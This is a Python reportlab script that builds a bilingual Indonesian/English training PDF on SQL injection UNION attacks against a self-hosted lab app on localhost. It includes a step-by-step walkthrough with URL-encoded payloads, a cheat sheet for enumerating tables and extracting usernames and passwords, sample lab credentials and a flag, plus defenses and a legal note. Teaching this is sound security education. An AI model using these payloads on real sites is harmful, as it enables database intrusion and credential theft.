# -*- coding: utf-8 -*-
"""PDF dua bahasa (ID + EN): modul belajar SQLi UNION attack, tingkat medium."""
from reportlab.lib.pagesizes import A4
from reportlab.lib.units import mm
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer, Table,
                                TableStyle, HRFlowable, Preformatted,
                                PageBreak, KeepTogether)
from reportlab.lib.enums import TA_LEFT, TA_CENTER

OUT = r"C:/Users/verzen/Desktop/belajar-coding/lab-sqli/MODUL-UNION-ATTACK-DWIBAHASA.pdf"

st = getSampleStyleSheet()
H1 = ParagraphStyle("H1", parent=st["Title"], fontSize=17, spaceAfter=2,
                    textColor=colors.HexColor("#0f172a"))
SUB = ParagraphStyle("SUB", parent=st["Normal"], fontSize=10,
                     textColor=colors.HexColor("#64748b"))
H2 = ParagraphStyle("H2", parent=st["Heading2"], fontSize=12.5, spaceBefore=10,
                    spaceAfter=4, textColor=colors.HexColor("#1e3a8a"))
H2E = ParagraphStyle("H2E", parent=H2, textColor=colors.HexColor("#047857"))
BODY = ParagraphStyle("BODY", parent=st["Normal"], fontSize=9.5, leading=13.5)
BODYE = ParagraphStyle("BODYE", parent=BODY, textColor=colors.HexColor("#1f2937"))
CODE = ParagraphStyle("CODE", parent=st["Code"], fontName="Courier", fontSize=8.5,
                      leading=11.5, backColor=colors.HexColor("#f1f5f9"))
NOTE = ParagraphStyle("NOTE", parent=BODY, fontSize=8.5, leading=12,
                      textColor=colors.HexColor("#64748b"))
LBL_ID = ParagraphStyle("LBL_ID", parent=BODY, fontSize=8, textColor=colors.white,
                        backColor=colors.HexColor("#1e3a8a"), fontName="Helvetica-Bold")
LBL_EN = ParagraphStyle("LBL_EN", parent=BODY, fontSize=8, textColor=colors.white,
                        backColor=colors.HexColor("#047857"), fontName="Helvetica-Bold")


def lbl(text, style):
    t = Table([[Paragraph(text, style)]], colWidths=[22 * mm])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, -1), style.backColor),
        ("LEFTPADDING", (0, 0), (-1, -1), 6),
        ("TOPPADDING", (0, 0), (-1, -1), 2),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 2),
    ]))
    return t


doc = SimpleDocTemplate(OUT, pagesize=A4, topMargin=15 * mm, bottomMargin=15 * mm,
                        leftMargin=18 * mm, rightMargin=18 * mm,
                        title="Modul SQL Injection UNION Attack (ID+EN)")
S = []
A = S.append

# ================= COVER =================
A(Paragraph("MODUL BELAJAR KEAMANAN WEB", H1))
A(Paragraph("SQL Injection — UNION Attack (Tingkat Medium)", SUB))
A(Spacer(1, 4))
A(HRFlowable(width="100%", thickness=1, color=colors.HexColor("#1e3a8a")))
A(Spacer(1, 8))

info = Table([
    ["Modul", "Lab #2 — UNION Attack: mencuri data dari tabel lain"],
    ["Level", "MEDIUM (naik dari Apprentice/Pemula)"],
    ["Prasyarat", "Lab #1 (bypass filter dengan OR 1=1)"],
    ["Target", "Lab lokal milik sendiri: sqli_app2.py di http://127.0.0.1:8011"],
    ["Misi", "Temukan password 'administrator' dari tabel users yang tersembunyi"],
    ["Bahasa", "Indonesia 🇮🇩 + English 🇬🇧 (tiap bagian dua kolom)"],
], colWidths=[30 * mm, 140 * mm])
info.setStyle(TableStyle([
    ("FONTNAME", (0, 0), (0, -1), "Helvetica-Bold"),
    ("FONTSIZE", (0, 0), (-1, -1), 9),
    ("GRID", (0, 0), (-1, -1), 0.4, colors.HexColor("#94a3b8")),
    ("BACKGROUND", (0, 0), (0, -1), colors.HexColor("#e0e7ff")),
    ("VALIGN", (0, 0), (-1, -1), "TOP"),
    ("TOPPADDING", (0, 0), (-1, -1), 3.5),
    ("BOTTOMPADDING", (0, 0), (-1, -1), 3.5),
]))
A(info)
A(Spacer(1, 8))

# ================= KONSEP =================
A(Paragraph("1. Konsep — Apa itu UNION Attack?", H2))
A(lbl("BAHASA INDONESIA", LBL_ID))
A(Paragraph(
    "Di lab sebelumnya (pemula), kita <b>mematikan filter</b> dengan OR 1=1 — "
    "hanya membocorkan data yang sudah ada di query. Lab ini naik kelas: "
    "<b>UNION</b> adalah operator SQL yang <b>menambahkan hasil query kedua</b> "
    "ke hasil query pertama. Artinya kita bisa membuat server menjalankan "
    "query BARU milik kita (misalnya SELECT password FROM users) dan "
    "menampilkannya di halaman orang lain.", BODY))
A(Spacer(1, 3))
A(Paragraph(
    "Syarat UNION (wajib hafal):", BODY))
A(Paragraph(
    "1. Jumlah <b>kolom sama</b> dengan query asli — cek dengan <b>ORDER BY</b><br/>"
    "2. Tipe data kompatibel — coba-salah dengan <b>NULL</b> atau string", BODY))
A(Spacer(1, 4))
A(Paragraph("Concept — What is a UNION attack?", H2E))
A(lbl("ENGLISH", LBL_EN))
A(Paragraph(
    "In the previous beginner lab we only <b>disabled a filter</b> using OR 1=1, "
    "which leaks rows the original query already touches. This lab levels up: "
    "<b>UNION</b> is a SQL operator that <b>appends the results of a second "
    "query</b> to the first. That means we can make the server execute a brand "
    "NEW query of our own (e.g. SELECT password FROM users) and display its "
    "results inside someone else's page.", BODYE))
A(Spacer(1, 3))
A(Paragraph("UNION requirements (memorize these):", BODYE))
A(Paragraph(
    "1. The <b>same number of columns</b> as the original query — probe with "
    "<b>ORDER BY</b><br/>"
    "2. Compatible data types — probe by substituting <b>NULL</b> or a string", BODYE))
A(Spacer(1, 6))

# ================= METODOLOGI =================
A(Paragraph("2. Metodologi — 4 Langkah (di semua lab UNION)", H2))
A(lbl("BAHASA INDONESIA", LBL_ID))
A(Paragraph(
    "<b>Langkah 1 — Hitung kolom:</b> suntik ' ORDER BY 1--, lalu 2, 3, ... "
    "sampai server error. Error = melebihi jumlah kolom. Kalau ORDER BY 2 OK "
    "tapi 3 error, jumlah kolom = 2.<br/>"
    "<b>Langkah 2 — Cari kolom teks:</b> suntik ' UNION SELECT 'a',NULL-- lalu "
    "' UNION SELECT NULL,'a'--. Halaman menampilkan 'a' di kolom yang cocok "
    "untuk teks.<br/>"
    "<b>Langkah 3 — Cari nama tabel/kolom:</b> kalau nama tabel tidak diketahui, "
    "tebak umum: users, user, accounts; atau baca sqlite_master (SQLite) / "
    "information_schema (MySQL).<br/>"
    "<b>Langkah 4 — Ekstrak data:</b> ' UNION SELECT username, password FROM users--", BODY))
A(Spacer(1, 4))
A(Paragraph("Methodology — 4 steps (works on every UNION lab)", H2E))
A(lbl("ENGLISH", LBL_EN))
A(Paragraph(
    "<b>Step 1 — Count columns:</b> inject ' ORDER BY 1--, then 2, 3, ... until "
    "the server errors. Error = exceeded the column count. If ORDER BY 2 works "
    "but 3 fails, there are exactly 2 columns.<br/>"
    "<b>Step 2 — Find text columns:</b> inject ' UNION SELECT 'a',NULL-- then "
    "' UNION SELECT NULL,'a'--. The page renders 'a' in whichever column accepts "
    "text.<br/>"
    "<b>Step 3 — Find table/column names:</b> if unknown, try common guesses: "
    "users, user, accounts; or read sqlite_master (SQLite) / information_schema "
    "(MySQL).<br/>"
    "<b>Step 4 — Extract data:</b> ' UNION SELECT username, password FROM users--", BODYE))
A(Spacer(1, 6))

# ================= WALKTHROUGH =================
A(Paragraph("3. Walkthrough — Penyelesaian Lab Ini (SPOILER!)", H2))
A(Paragraph(
    "Coba sendiri dulu! Bagian ini = kunci jawaban. Sama seperti lab #1, "
    "semua request dijalankan pada lab lokal (127.0.0.1:8011) milik sendiri.", BODY))
A(Spacer(1, 3))

steps = [
    ("Langkah 1 / Step 1 — ORDER BY",
     "' ORDER BY 2--   → OK (2 kolom)\n"
     "' ORDER BY 3--   → HTTP 500 (error = hanya 2 kolom)",
     "URL: /filter?kategori=Gifts%27%20ORDER%20BY%202--"),
    ("Langkah 2 / Step 2 — UNION dengan string",
     "' UNION SELECT 'a','b'--\n"
     "→ Halaman menampilkan baris 'a' | 'b' = kedua kolom teks",
     "URL: /filter?kategori=%27%20UNION%20SELECT%20%27a%27,%27b%27--"),
    ("Langkah 3 / Step 3 — Serangan utama",
     "' UNION SELECT username, password FROM users--\n"
     "→ Tabel produk kini menampilkan kredensial!",
     "URL: /filter?kategori=%27%20UNION%20SELECT%20username,password%20FROM%20users--"),
]
for judul, kode, url in steps:
    blok = [Paragraph(judul, H2 if "Langkah 1" in judul else H2E),
            Preformatted(kode, CODE)]
    kt = KeepTogether(blok)
    S.append(kt)
    A(Spacer(1, 2))
    A(Paragraph(f"URL lengkap: {url}", NOTE))
    A(Spacer(1, 4))

# ================= HASIL =================
hasil = Table([
    ["Username", "Password (hasil UNION)"],
    ["administrator", "Flag{union_attack_medium}"],
    ["wiener", "PeterW1ener"],
    ["carlos", "Montoya123"],
], colWidths=[50 * mm, 90 * mm])
hasil.setStyle(TableStyle([
    ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
    ("FONTSIZE", (0, 0), (-1, -1), 8.5),
    ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#1e3a8a")),
    ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
    ("GRID", (0, 0), (-1, -1), 0.4, colors.HexColor("#94a3b8")),
    ("BACKGROUND", (0, 1), (-1, 1), colors.HexColor("#fef3c7")),
    ("TOPPADDING", (0, 0), (-1, -1), 3),
    ("BOTTOMPADDING", (0, 0), (-1, -1), 3),
]))
A(KeepTogether([Paragraph("4. Hasil yang Harus Muncul", H2),
                Paragraph("Hasil yang harus kamu lihat (verifikasi keberhasilan):", BODY),
                Spacer(1, 3), hasil,
                Spacer(1, 2),
                Paragraph("Baris kuning = target misi. Kalau tampil di tabel toko, "
                          "serangan UNION kamu sukses.", NOTE)]))

A(PageBreak())

# ================= MENGAPA BEKERJA =================
A(Paragraph("5. Mengapa Ini Bekerja? (Pemahaman Dalam)", H2))
A(lbl("BAHASA INDONESIA", LBL_ID))
A(Paragraph(
    "Query asli mengembalikan 2 kolom (nama, harga). UNION SELECT username, "
    "password mengembalikan 2 kolom juga — jumlahnya cocok, tipe kolomnya "
    "(teks) juga cocok. SQLite menjalankan keduanya dan <b>menempelkan</b> "
    "hasilnya. Karena kode server menampilkan SEMUA baris tanpa memeriksa "
    "asal-usulnya, kredensial pun ikut tampil di halaman produk.", BODY))
A(Spacer(1, 3))
A(Preformatted(
    "SELECT nama, harga FROM products WHERE kategori = '' UNION\n"
    "SELECT username, password FROM users--' AND released = 1\n"
    "      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n"
    "      query kedua milik PENYERANG, hasilnya ditempel ke halaman", CODE))
A(Spacer(1, 4))
A(Paragraph("Why does this work? (deep understanding)", H2E))
A(lbl("ENGLISH", LBL_EN))
A(Paragraph(
    "The original query returns 2 columns (name, price). UNION SELECT username, "
    "password also returns 2 columns — count matches, types (text) match. SQLite "
    "executes both and <b>glues</b> the results together. Because the server "
    "renders EVERY row without checking where it came from, credentials end up "
    "displayed on the product page.", BODYE))
A(Spacer(1, 3))
A(Preformatted(
    "SELECT name, price FROM products WHERE category = '' UNION\n"
    "SELECT username, password FROM users--' AND released = 1\n"
    "     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n"
    "     the ATTACKER's second query, appended to the page", CODE))
A(Spacer(1, 6))

# ================= DEFENSE =================
A(Paragraph("6. Cara Mencegahnya (Defensi)", H2))
A(lbl("BAHASA INDONESIA", LBL_ID))
A(Paragraph(
    "1. <b>Parameterized query</b> — input tidak pernah menjadi kode SQL:<br/>"
    "<font face='Courier' size='8.5'>cur.execute(\"SELECT nama, harga FROM products WHERE kategori = ? AND released = 1\", (kategori,))</font><br/>"
    "2. <b>Whitelist kategori</b> — validasi nilai terhadap daftar tetap.<br/>"
    "3. <b>Least privilege</b> — akun DB aplikasi tidak butuh akses tabel users.<br/>"
    "4. <b>Jangan tampilkan error mentah</b> — log internal saja.", BODY))
A(Spacer(1, 4))
A(Paragraph("How to prevent it (defense)", H2E))
A(lbl("ENGLISH", LBL_EN))
A(Paragraph(
    "1. <b>Parameterized queries</b> — user input never becomes SQL code:<br/>"
    "<font face='Courier' size='8.5'>cur.execute(\"SELECT name, price FROM products WHERE category = ? AND released = 1\", (category,))</font><br/>"
    "2. <b>Whitelist categories</b> — validate against a fixed list.<br/>"
    "3. <b>Least privilege</b> — the app's DB account shouldn't read users at all.<br/>"
    "4. <b>Never surface raw errors</b> — log them server-side only.", BODYE))
A(Spacer(1, 8))

# ================= CHEATSHEET =================
A(Paragraph("7. Cheat Sheet UNION (simpan ini!)", H2))
A(Preformatted(
    "Jumlah kolom       : ' ORDER BY N--                (naikkan N sampai error)\n"
    "Tipe kolom (teks)  : ' UNION SELECT 'a',NULL--     (geser 'a' ke tiap kolom)\n"
    "Baca nama tabel    : ' UNION SELECT table_name,NULL FROM sqlite_master--\n"
    "Baca kolom tabel   : ' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table'\n"
    "Ekstrak data       : ' UNION SELECT username,password FROM users--\n"
    "MySQL equivalent   : information_schema.tables / .columns", CODE))
A(Spacer(1, 6))
A(Paragraph("8. Legal & Etika", H2))
A(Paragraph(
    "ID : Semua teknik di modul ini HANYA untuk lab milik sendiri (localhost). "
    "Menggunakannya pada sistem orang lain tanpa izin tertulis = kejahatan "
    "komputer (UU ITE / Computer Misuse Act). Jalur legal menuju target nyata: "
    "bug bounty dengan scope jelas (HackerOne/Bugcrowd/Immunefi).", BODY))
A(Spacer(1, 3))
A(Paragraph(
    "EN : Every technique in this module is for YOUR OWN local lab only "
    "(localhost). Using them against systems you don't own without written "
    "permission is a computer crime (Indonesian IT law / Computer Misuse Act). "
    "The legal path to real targets: bug bounty programs with explicit scope "
    "(HackerOne/Bugcrowd/Immunefi).", BODY))

doc.build(S)
print("PDF tersimpan:", OUT)
